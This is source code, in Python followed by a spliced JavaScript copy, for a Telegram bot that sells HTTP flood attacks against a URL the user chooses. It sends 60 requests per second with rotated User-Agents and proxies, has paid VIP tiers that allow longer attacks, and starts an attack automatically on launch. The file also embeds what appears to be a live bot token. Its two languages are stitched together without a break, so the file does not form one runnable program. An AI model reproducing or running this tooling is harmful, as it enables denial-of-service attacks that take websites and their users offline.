import os
import json
import random
import time
from datetime import datetime, timedelta
from pathlib import Path
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# 📂 ឯកសារសម្រាប់ User-Agent
USER_AGENT_FILES = [
    Path(__file__).parent / 'HanX.txt',
    Path(__file__).parent / 'proxy.txt'
]

# 📥 អាន User-Agent ពីឯកសារ
def load_user_agents(files):
    agents = []
    for file in files:
        try:
            with open(file, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
                agents.extend(lines)
        except Exception as e:
            print(f"⚠️ មិនអាចអានឯកសារ: {file} | {str(e)}")
    return agents

# 🎲 ជ្រើសរើស User-Agent ដោយចៃដន្យ
def get_random_user_agent(agents):
    return agents[random.randint(0, len(agents)-1)] if agents else 'Mozilla/5.0 (default user agent)'

user_agents = load_user_agents(USER_AGENT_FILES)
TELEGRAM_TOKEN = '8463606454:AAGRl7u0PTKHlBBB4jqQESBpsz73smyx2dE'  # 🛑 Replace with your token
ADMIN_IDS = [7893036607]  # 👑 Replace with your Telegram ID
VIP_FILE = Path(__file__).parent / 'vip.json'

# 📁 VIP Logic
def get_vip_data():
    try:
        with open(VIP_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_vip_data(data):
    with open(VIP_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

def is_vip(user_id):
    vip_data = get_vip_data()
    user = vip_data.get(str(user_id))
    if not user:
        return False
    return datetime.fromisoformat(user['expire']) > datetime.now()

# 🚀 Attack Function
def send_attack_request(target_url):
    headers = {
        'User-Agent': get_random_user_agent(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        response = requests.get(target_url, headers=headers, timeout=5)
        print(f"⚡️ Attack: {target_url} | Status: {response.status_code}")
        return response.status_code
    except Exception as e:
        print(f"❌ Failed: {target_url} | Error: {str(e)}")
        return None

is_attacking = False
attack_job = None
countdown_job = None

REQUESTS_PER_SECOND = 60
ATTACK_DURATION_FREE = 60  # Free users upper limit (seconds)
ATTACK_DURATION_VIP = 500  # VIP users upper limit (seconds)
ATTACK_DURATION_ADMIN_MAX = 1080000  # Admin max duration (3 hours in seconds)

# 🛑 Stop Attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking, attack_job, countdown_job
    if attack_job:
        attack_job.schedule_removal()
        attack_job = None
    if countdown_job:
        countdown_job.schedule_removal()
        countdown_job = None
    is_attacking = False
    if update:
        await update.message.reply_text('🛑 Attack stopped.')

# ▶️ Start Attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking, attack_job, countdown_job
    chat_id = update.message.chat_id
    user_id = update.message.from_user.id
    args = context.args

    if is_attacking:
        await update.message.reply_text('⚠️ An attack is already in progress.')
        return

    if len(args) < 1 or not args[0].startswith(('http://', 'https://')):
        await update.message.reply_text('Example:\n/attack https://example.com 120')
        return

    target_url = args[0]
    duration = int(args[1]) if len(args) > 1 and args[1].isdigit() else ATTACK_DURATION_FREE

    max_duration = ATTACK_DURATION_ADMIN_MAX if user_id in ADMIN_IDS else ATTACK_DURATION_VIP if is_vip(user_id) else ATTACK_DURATION_FREE

    if user_id not in ADMIN_IDS and duration > max_duration:
        is_user_vip = is_vip(user_id)
        msg = f"🚫 You are a {'VIP' if is_user_vip else 'Free'} User, cannot attack beyond {max_duration} seconds!\n"
        if not is_user_vip:
            msg += '📩 Contact admin to buy VIP.'
        await update.message.reply_text(msg)
        return

    is_attacking = True
    remaining = duration
    check_host_url = f"https://check-host.net/check-http?host={requests.utils.quote(target_url)}"

    async def attack_task(context: ContextTypes.DEFAULT_TYPE):
        for _ in range(REQUESTS_PER_SECOND):
            send_attack_request(target_url)

    async def countdown_task(context: ContextTypes.DEFAULT_TYPE):
        nonlocal remaining
        remaining -= 1
        if remaining <= 0:
            await stop_attack(None, context)
            await context.bot.send_message(chat_id, f"✅ Attack finished ({duration}s)")
        else:
            try:
                await context.bot.edit_message_text(
                    f"🚀 Attack Started!\n🌐 Target: {target_url}\n⏰ Time: {remaining}s / {duration}s\n🔍 Check: {check_host_url}",
                    chat_id=chat_id,
                    message_id=context.job.data
                )
            except:
                pass

    message = await update.message.reply_text(
        f"🚀 Attack Started!\n🌐 Target: {target_url}\n⏰ Time: {remaining}s / {duration}s\n🔍 Check: {check_host_url}"
    )
    attack_job = context.job_queue.run_repeating(attack_task, interval=1, first=0)
    countdown_job = context.job_queue.run_repeating(countdown_task, interval=1, first=1, data=message.message_id)

# Auto-start attack on bot initialization (for testing)
async def auto_start_attack(context: ContextTypes.DEFAULT_TYPE):
    global is_attacking
    if not is_attacking:
        is_attacking = True
        target_url = "https://example.com"  # 🛑 Replace with your target URL
        duration = ATTACK_DURATION_FREE  # Default to free tier limit
        chat_id = 7893036607  # 🛑 Replace with your chat ID for notifications

        remaining = duration
        check_host_url = f"https://check-host.net/check-http?host={requests.utils.quote(target_url)}"

        async def attack_task(context: ContextTypes.DEFAULT_TYPE):
            for _ in range(REQUESTS_PER_SECOND):
                send_attack_request(target_url)

        async def countdown_task(context: ContextTypes.DEFAULT_TYPE):
            nonlocal remaining
            remaining -= 1
            if remaining <= 0:
                await stop_attack(None, context)
                await context.bot.send_message(chat_id, f"✅ Auto-attack finished ({duration}s)")
            else:
                try:
                    await context.bot.send_message(chat_id,
                        f"🚀 Auto-Attack Started!\n🌐 Target: {target_url}\n⏰ Time: {remaining}s / {duration}s\n🔍 Check: {check_host_url}"
                    )
                except:
                    pass

        message = await context.bot.send_message(chat_id,
            f"🚀 Auto-Attack Started!\n🌐 Target: {target_url}\n⏰ Time: {remaining}s / {duration}s\n🔍 Check: {check_host_url}"
        )
        attack_job = context.job_queue.run_repeating(attack_task, interval=1, first=0)
        countdown_job = context.job_queue.run_repeating(countdown_task, interval=1, first=1, data=message.message_id)

# 📌 Command Handlers
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text('❌ You do not have permission to stop the attack.')
        return
    if not is_attacking:
        await update.message.reply_text('🤖 No attack is currently running.')
        return
    await stop_attack(update, context)

async def start_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "Bot Commands:\n"
        "➤ /attack [url] [seconds] – Start attack (admins up to 3hrs)\n"
        "➤ /stop – Stop the attack (admin only)\n"
        "➤ /check [url] – Check site status\n"
        "➤ /buyvip – Buy VIP membership info\n"
        "➤ /viplist – View VIP users (admin only)\n"
        "➤ /addvip <id> <days> – Add VIP user (admin only)\n"
        "➤ /removevip <id> – Remove VIP user (admin only)"
    )
    await update.message.reply_text(help_text)

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args or not args[0].startswith(('http://', 'https://')):
        await update.message.reply_text('Example:\n/check https://example.com')
        return
    url = args[0]
    check_url = f"https://check-host.net/check-http?host={requests.utils.quote(url)}"
    await update.message.reply_text(f"🔍 Check this URL:\n{check_url}")

async def buy_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💎 VIP Membership\n"
        "➤ Time Limit: 500s attacks\n"
        "➤ Access: Exclusive Commands\n"
        "💰 Price: $5/month\n"
        "📩 Contact admin: @Zen_Rocert"
    )

async def vip_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    vip_data = get_vip_data()
    list_text = '\n'.join(
        f"👤 {id} - expires: {datetime.fromisoformat(info['expire']).strftime('%Y-%m-%d %H:%M:%S')}"
        for id, info in vip_data.items()
    ) or 'No VIPs yet.'
    await update.message.reply_text(f"📜 VIP List:\n{list_text}")

async def add_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    args = context.args
    if len(args) != 2 or not args[0].isdigit() or not args[1].isdigit():
        await update.message.reply_text('Usage: /addvip <user_id> <days>')
        return
    target_id, days = args[0], int(args[1])
    vip_data = get_vip_data()
    now = datetime.now()
    current_expire = datetime.fromisoformat(vip_data.get(target_id, {}).get('expire', now.isoformat())) if target_id in vip_data else now
    base_date = max(current_expire, now)
    new_expire = base_date + timedelta(days=days)
    vip_data[target_id] = {'expire': new_expire.isoformat()}
    save_vip_data(vip_data)
    await update.message.reply_text(f"✅ Added VIP: {target_id} until {new_expire.strftime('%Y-%m-%d %H:%M:%S')}")

async def remove_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text('Usage: /removevip <user_id>')
        return
    target_id = args[0]
    vip_data = get_vip_data()
    if target_id in vip_data:
        del vip_data[target_id]
        save_vip_data(vip_data)
        await update.message.reply_text(f"❌ Removed VIP: {target_id}")
    else:
        await update.message.reply_text(f"⚠️ User ID {target_id} is not VIP.")

# 🎮 Main
def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler('attack', start_attack))
    app.add_handler(CommandHandler('stop', stop))
    app.add_handler(CommandHandler(['start', 'help'], start_help))
    app.add_handler(CommandHandler('check', check))
    app.add_handler(CommandHandler('buyvip', buy_vip))
    app.add_handler(CommandHandler('viplist', vip_list))
    app.add_handler(CommandHandler('addvip', add_vip))
    app.add_handler(CommandHandler('removevip', remove_vip))
    
    # Schedule auto-attack on bot start
    app.job_queue.run_once(auto_start_attack, 1)  # Runs after 1 second
    
    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()const bot = new TelegramBot(telegramToken, { polling: true });

const adminIds = [7893036607]; // 👑 ដូរជាមួយ Telegram ID របស់អ្នកជាអ្នកគ្រប់គ្រង
const VIP_FILE = path.join(__dirname, 'vip.json');

// 📁 VIP Logic
function getVipData() {
  try {
    return JSON.parse(fs.readFileSync(VIP_FILE, 'utf8'));
  } catch {
    return {};
  }
}

function saveVipData(data) {
  fs.writeFileSync(VIP_FILE, JSON.stringify(data, null, 2));
}

function isVip(userId) {
  const vipData = getVipData();
  const user = vipData[userId];
  if (!user) return false;
  return new Date(user.expire) > new Date();
}

// 🚀 Attack Function
function sendAttackRequest(targetUrl) {
  const headers = {
    'User-Agent': getRandomUserAgent(userAgents),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
  };

  return fetch(targetUrl, { headers })
    .then(res => {
      console.log(`⚡️ Attack: ${targetUrl} | Status: ${res.status}`);
      return res.status;
    })
    .catch(err => {
      console.error(`❌ Failed: ${targetUrl} | Error: ${err.message}`);
    });
}

let attackTimer = null;
let countdownTimer = null;
let isAttacking = false;

const REQUESTS_PER_SECOND = 60;
const ATTACK_DURATION_FREE = 60;           // Free users upper limit (seconds)
const ATTACK_DURATION_VIP = 500;           // VIP users upper limit (seconds)
const ATTACK_DURATION_ADMIN_MAX = 1080000;   // Admin max duration (3 hours in seconds)

// 🛑 Stop Attack
function stopAttack(chatId) {
  clearInterval(attackTimer);
  clearInterval(countdownTimer);
  isAttacking = false;
  if (chatId) bot.sendMessage(chatId, '🛑 Attack stopped.');
}

// ▶️ Start Attack
function startAttack(chatId, url, userId, duration) {
  if (isAttacking) return bot.sendMessage(chatId, '⚠️ An attack is already in progress.');

  isAttacking = true;

  let maxDuration;

  if (adminIds.includes(userId)) {
    maxDuration = ATTACK_DURATION_ADMIN_MAX;
  } else if (isVip(userId)) {
    maxDuration = ATTACK_DURATION_VIP;
  } else {
    maxDuration = ATTACK_DURATION_FREE;
  }

  const attackDuration = parseInt(duration) || ATTACK_DURATION_FREE;

  if (!adminIds.includes(userId) && attackDuration > maxDuration) {
    const isUserVip = isVip(userId);
    return bot.sendMessage(chatId,
      `🚫 អ្នកគឺជា ${isUserVip ? 'VIP' : 'Free'} User មិនអាចវាយលើស ${maxDuration} វិនាទីទេ!\n` +
      `${!isUserVip ? '📩 សូមទាក់ទងអ្នកគ្រប់គ្រង ដើម្បីទិញ VIP។' : ''}`
    );
  }

  let remaining = attackDuration;
  const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;

  const attackInfo = () => 
    `🚀 Attack Started!\n🌐 Target: ${url}\n⏰ Time: ${remaining}s / ${attackDuration}s\n🔍 Check: ${checkHostUrl}`;

  bot.sendMessage(chatId, attackInfo()).then(msg => {
    countdownTimer = setInterval(() => {
      remaining--;
      if (remaining <= 0) {
        stopAttack(chatId);
        bot.sendMessage(chatId, `✅ Attack finished (${attackDuration}s)`);
      } else {
        bot.editMessageText(attackInfo(), {
          chat_id: chatId,
          message_id: msg.message_id
        }).catch(() => {});
      }
    }, 1000);

    attackTimer = setInterval(() => {
      for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
        sendAttackRequest(url);
      }
    }, 1000);
  });
}

// 📌 Commands handlers

// /attack command
bot.onText(/\/attack(?:\s+([^\s]+))?(?:\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetUrl = match[1];
  const duration = match[2];

  if (!targetUrl || !/^https?:\/\//i.test(targetUrl)) {
    return bot.sendMessage(chatId, 'Example:\n/attack https://example.com 120');
  }

  startAttack(chatId, targetUrl, userId, duration);
});

// /stop command (admin only)
bot.onText(/\/stop/, msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminIds.includes(userId)) {
    return bot.sendMessage(chatId, '❌ You do not have permission to stop the attack.');
  }

  if (!isAttacking) {
    return bot.sendMessage(chatId, '🤖 No attack is currently running.');
  }

  stopAttack(chatId);
});

// /start or /help - show help menu
bot.onText(/\/(start|help)/, msg => {
  const help = 
`Bot Commands:
➤ /attack [url] [seconds] – Start attack (admins up to 3hrs)
➤ /stop – Stop the attack (admin only)
➤ /check [url] – Check site status
➤ /buyvip – Buy VIP membership info
➤ /viplist – View VIP users (admin only)
➤ /addvip <id> <days> – Add VIP user (admin only)
➤ /removevip <id> – Remove VIP user (admin only)`;

  bot.sendMessage(msg.chat.id, help);
});

// /check command
bot.onText(/\/check(?:\s+(https?:\/\/[^\s]+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url) {
    return bot.sendMessage(chatId, 'Example:\n/check https://example.com');
  }

  const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
  bot.sendMessage(chatId, `🔍 Check this URL:\n${checkUrl}`);
});

// /buyvip command
bot.onText(/\/buyvip/, msg => {
  bot.sendMessage(msg.chat.id,
    `💎 VIP Membership
➤ Time Limit: 500s attacks
➤ Access: Exclusive Commands
💰 Price: $5/month
📩 Contact admin: @Zen_Rocert`
  );
});

// /viplist command (admin only)
bot.onText(/\/viplist/, msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminIds.includes(userId)) return;

  const vipData = getVipData();
  const list = Object.entries(vipData)
    .map(([id, info]) => `👤 ${id} - expires: ${new Date(info.expire).toLocaleString()}`)
    .join('\n') || 'No VIPs yet.';

  bot.sendMessage(chatId, `📜 VIP List:\n${list}`);
});

// /addvip command (admin only)
bot.onText(/\/addvip (\d+) (\d+)/, (msg, match) => {
  const userId = msg.from.id;
  if (!adminIds.includes(userId)) return;

  const targetId = match[1];
  const days = parseInt(match[2], 10);

  const vipData = getVipData();
  const now = new Date();
  const currentExpire = vipData[targetId]?.expire ? new Date(vipData[targetId].expire) : now;
  const baseDate = currentExpire > now ? currentExpire : now;

  const newExpire = new Date(baseDate.getTime() + days * 86400000);
  vipData[targetId] = { expire: newExpire.toISOString() };
  saveVipData(vipData);

  bot.sendMessage(msg.chat.id, `✅ Added VIP: ${targetId} until ${newExpire.toLocaleString()}`);
});

// /removevip command (admin only)
bot.onText(/\/removevip (\d+)/, (msg, match) => {
  const userId = msg.from.id;
  if (!adminIds.includes(userId)) return;

  const targetId = match[1];
  const vipData = getVipData();

  if (vipData[targetId]) {
    delete vipData[targetId];
    saveVipData(vipData);
    bot.sendMessage(msg.chat.id, `❌ Removed VIP: ${targetId}`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ User ID ${targetId} is not VIP.`);
  }
});
